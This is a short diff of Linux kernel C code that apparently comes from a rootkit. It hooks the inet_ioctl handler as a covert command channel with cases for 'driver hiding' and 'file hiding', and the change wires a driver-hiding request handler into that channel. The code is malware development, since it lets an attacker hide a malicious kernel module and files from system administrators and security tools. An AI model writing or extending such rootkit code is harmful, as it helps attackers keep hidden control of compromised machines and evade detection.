@@ -54,6 +54,7 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long
         switch (cmd_arg.action) {
             case 0x0:
                 // driver hiding
+                handle_driver_hiding_request(cmd_arg.subargs);
                 break;
             case 0x1:
                 // file hiding
